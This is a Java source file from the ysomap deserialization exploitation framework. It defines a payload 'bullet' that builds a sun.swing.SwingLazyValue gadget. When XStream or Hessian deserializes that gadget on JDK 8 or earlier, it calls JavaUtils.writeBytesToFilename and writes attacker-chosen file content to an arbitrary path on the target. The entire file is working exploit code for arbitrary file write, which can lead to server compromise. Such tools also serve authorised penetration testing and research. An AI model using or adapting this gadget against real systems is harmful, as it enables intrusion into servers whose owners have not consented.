package ysomap.bullets.jdk;

import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.FileHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3p1g
 * @since 2022/3/19
 */
@Bullets
@Dependencies({"jdk"})
@Details("写文件")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithFileWriteBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "filepath", detail = "/tmp/test")
    public String filepath;

    @NotNull
    @Require(name = "localFile", detail = "/tmp/test")
    public String localFile;

    @Override
    public Object getObject() throws Exception {
        String classname = "com.sun.org.apache.xml.internal.security.utils.JavaUtils";
        String methodName = "writeBytesToFilename";

        Object[] evilargs = new Object[]{filepath, FileHelper.getFileContent(localFile)};
        try{
            return ReflectionHelper.newInstance(
                    "sun.swing.SwingLazyValue",
                    new Class[]{String.class, String.class, Object[].class},
                    classname, methodName, evilargs);
        }catch (Exception e){
            Logger.error("Create sun.swing.SwingLazyValue, plz check current jdk is <=8.");
            return null;
        }
    }
}
